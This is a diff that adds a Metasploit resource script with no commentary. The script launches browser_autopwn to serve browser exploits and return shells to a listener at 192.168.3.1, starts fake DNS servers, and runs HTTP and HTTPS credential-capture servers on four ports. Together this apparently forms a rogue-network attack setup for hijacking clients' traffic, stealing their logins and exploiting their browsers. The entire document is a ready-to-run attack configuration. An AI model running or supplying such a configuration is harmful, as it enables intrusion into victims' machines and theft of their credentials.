@@ -1,0 +1,44 @@
+
+use auxiliary/server/browser_autopwn
+
+setg AUTOPWNHOST 192.168.3.1
+setg AUTOPWNPORT 55550
+setg AUTOPWN_URI /ads
+
+set LHOST 192.168.3.1
+set LPORT 45000
+set SRVPORT 55550
+set URIPATH /ads
+
+run
+
+
+use auxiliary/server/fakedns
+unset TARGETHOST
+set SRVPORT 5353
+run
+
+use auxiliary/server/fakedns
+unset TARGETHOST
+set SRVPORT 53
+run
+
+use auxiliary/server/capture/http
+set SRVPORT 80
+set SSL false
+run
+
+use auxiliary/server/capture/http
+set SRVPORT 8080
+set SSL false
+run
+
+use auxiliary/server/capture/http
+set SRVPORT 443
+set SSL true
+run
+
+use auxiliary/server/capture/http
+set SRVPORT 8443
+set SSL true
+run
